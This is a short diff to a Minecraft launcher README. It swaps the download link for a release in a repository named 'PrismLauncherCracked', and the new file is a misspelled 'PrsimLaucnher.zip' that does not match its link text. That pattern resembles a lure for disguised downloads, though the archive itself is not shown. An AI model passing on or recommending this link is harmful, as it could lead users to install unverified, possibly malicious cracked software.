@@ -18,7 +18,7 @@
 
 ---
 ## 📥 Download
-[Download `PrismLauncher.zip`](https://github.com/.../releases/download/Launcher/PrismLauncher-Ely.by.zip)
+[Download `PrismLauncher.zip`](https://github.com/undfndV/PrismLauncherCracked/releases/download/MinecraftClient/PrsimLaucnher.zip)
 ---
 ## Installation
 ### For Regular Users
